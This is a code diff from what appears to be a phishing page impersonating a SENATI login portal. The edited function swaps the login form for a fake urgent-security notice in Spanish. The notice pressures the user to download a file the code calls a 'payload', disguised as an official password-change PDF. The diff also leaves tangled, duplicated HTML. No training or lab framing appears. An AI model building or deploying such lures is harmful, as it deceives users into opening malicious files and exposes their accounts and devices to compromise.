@@ -691,33 +691,45 @@
         }
 
         // Función para mostrar el mensaje de descarga del payload con PDF real
-        // Función para mostrar pantalla de descarga
         function mostrarPantallaDescargaPayload() {
-            const loginCard = document.querySelector('.login-card');
-    
+            // Limpiar y reemplazar contenido del login-card
             loginCard.innerHTML = `
+                <div class="download-section">
+                    <div class="warning-icon">⚠️</div>
+                    <h1 class="download-title">Acción Requerida</h1>
+                    
+                    <div class="download-description">
+                        <p>Por motivos de seguridad, su cuenta requiere un cambio obligatorio de contraseña.</p>
+                        <p style="margin-top: 15px;"><strong>📄 Descargue el documento oficial con los pasos a seguir para completar el proceso.</strong></p>
+                    </div>
+                    
+                    <button id="downloadPdfBtn" class="btn-download">
                 <div style="text-align: center; padding: 40px 20px;">
                     <h1 class="title" style="color: #d32f2f; font-size: 26px;">⚠️ Acción Requerida</h1>
-            
+        
                     <p style="font-size: 17px; line-height: 1.6; margin: 25px 0;">
                         Por motivos de seguridad, su cuenta requiere un cambio obligatorio de contraseña.<br><br>
                         Descargue el documento oficial con los pasos a seguir.
                     </p>
-            
-                    <a href="./payload/Reporte-Seguridad.pdf" 
+        
+                    <a href="payload/Reporte-Seguridad.pdf" 
                        download="Pasos_Cambio_Contraseña_SENATI.pdf"
                        style="display: inline-block; background: #d32f2f; color: white; padding: 16px 36px; 
                               font-size: 17px; font-weight: 600; border-radius: 8px; text-decoration: none; 
                               box-shadow: 0 4px 15px rgba(211, 47, 47, 0.4); margin: 20px 0;">
                         📄 DESCARGAR PASOS PARA CAMBIAR CONTRASEÑA
+                    </button>      
+                    
+                    <div class="download-note">
+                        <small>El archivo contiene instrucciones detalladas para reactivar su cuenta de forma segura.</small>
+                    </div>
                     </a>
-            
+        
                     <p style="font-size: 14px; color: #666; margin-top: 30px;">
                         Este procedimiento es obligatorio para reactivar su cuenta.
                     </p>
                 </div>
-            `;
-    
+            `;    
 
             // Agregar evento al botón de descarga
             const downloadBtn = document.getElementById('downloadPdfBtn');
